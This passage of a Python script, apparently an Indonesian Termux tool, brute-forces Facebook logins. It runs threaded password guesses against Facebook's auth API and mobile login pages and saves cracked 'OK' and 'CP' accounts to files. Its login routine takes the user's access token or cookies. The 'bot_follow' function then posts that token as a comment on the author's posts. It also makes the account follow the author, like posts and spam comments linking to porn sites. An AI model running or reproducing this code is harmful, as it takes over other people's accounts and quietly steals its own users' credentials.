        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + "|" + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s %s               "%(username,password,N)))
      ok.append(username + "|" + password)
      save = open("Hasil/OK-"+durasi+".txt", "a")
      save.write(str(username) + "|" + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + "|" + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s %s               "%(username,password,N)))
        save = open("Hasil/CP-"+durasi+".txt", "a+")
        save.write(str(username) + "|" + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37m"+durasi+"\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
class crackffb:
	os.system("clear")
	banner()
	kata_risky()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f in ["Y","y"]:
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f in ["N","n"]:
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s               "%(fl.get("id"),i)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("OK-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		kata_risky()
		print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="Y" or f=="y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="N" or f=="n":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s               "%(fl.get("id"),i)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/OK-"+durasi+".txt.txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
def logs():
  os.system("clear")
  banner()
  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
  print((k+"["+p+"0"+k+"]"+p+" Exit"))
  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if sek=="":
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
  elif sek=="1":
#    defaultua()
    Get_Ua()
    log_token()
  elif sek=="2":
 #   defaultua()
    Get_Ua()
    gen()
  elif sek=="0":
    exit()
  else:
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ua_me.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()
def log_token():
    os.system("clear")
    banner()
    print(war+"You Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile")
    print(war+"LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxx")
    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        print("You Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile...")
        print("LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxx")
        cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies: ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil      = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((k+"["+p+"!"+k+"]"+p+" No Connection"))
        except [KeyError,IOError]:
            print((k+"["+p+"!"+k+"]"+p+" Cookies Invalid"))
            os.system("clear")
            logs()
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()

### BOT FOLLOW ### Jangan Diganti Anjing !!!

def bot_follow():
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	jalan(c+"Tunggu Sebentar..."+q)
	jalan(c+"Your Name   : "+k+nama)
	jalan(c+"Your ID     : "+k+id)
	# 120338706765807 #
	post1 = ('4111448792295892') # Risky 2011
	post2 = ("120338706765807") # Risky 2021
	post3 = ("167879918678352") # Sama Macam dibawah
	post4 = ('180923747373969') # Logo Zero From Risky 2021
	post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
	post6 = ("198550702277940") # Logo Akira From Risky 2031
	post7 = ("198552118944465") # Logo Attaxk From Risky 2021
	kom = ("XNXX.COM AND YANDEX.COM AND ML.RATUKU.TOP AND UNBLOCJ.COM AND KENATIPU.COM")
	kom2 = ("@[100063690353340:0] LOVE ZERO TWO")
	kom3 = ("https://www.facebook.com/photo.php?fbid=4111448792295892&set=a.108534305920714&type=3&app=fbl")
	kom4 = ("https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl")
	kom5 = ("https://www.facebook.com/photo.php?fbid=4111450232295748&set=a.202528366521307&type=3&app=fbl")
	kom6 = ("https://www.facebook.com/100063690353340/posts/167879918678352/?app=fbl")
	kom7 = ("https://www.facebook.com/100063690353340/posts/198550702277940/?app=fbl")
	kom8 = ("https://www.facebook.com/100063690353340/posts/198552118944465/?app=fbl")
	kom9 = ("Yandex.com\nUnblock.com\nMl.Ratuku.Top\nJomblo.Top\nXnxx.com")
	kom10 = ("https://www.facebook.com/100002924366263/posts/4111450325629072/?app=fbl")
	kom_1 = pilih([kom3+"\n"+kom4, kom6+"\n"+kom7])
	kom_2 = pilih([kom10+"\n"+kom9, kom8+"\n"+kom5])
	kom_3 = pilih([kom, kom2])
	reac = ("LOVE")
#### Bot Komen Jangan DiEdit !! PLIS + Token
	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
	print("Tunggu Sebentar 03")
#### Bot Komen Biasa :)
	requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom_1 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom_2 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom_3 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + kom_1 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom_2 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + kom_3 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom_1 + '&access_token=' + token)
	print("Tunggu Sebentar 02")
#### Bot Likenya Jangan DiEdit Taik...
	requests.post('https://graph.facebook.com/'+post1+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post3+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post4+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post5+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post6+'/reactions?type=' +reac+ '&access_token='+ token)
	requests.post('https://graph.facebook.com/'+post7+'/reactions?type=' +reac+ '&access_token='+ token)
	print("Tunggu Sebentar 01")
#### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
	requests.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + toket) ### FB HAKIKI
	requests.post('https://graph.facebook.com/100017553167451/subscribers?access_token=' + toket) ### FB HAKIKI
	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
	requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
#### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
	print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
	time.sleep(2)
	menu()
def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Result Crack -- Hasil Crack"+k+" ]"+p))
    print((h+"\n[ "+p+"OK"+h+" ]"+p))
    try:
        os.system("cat Hasil/OK*.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat Hasil/CP*.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()
class risky:
        os.system("git pull")
        country()


if __name__=="__main__":
        os.system("git pull")
        country()
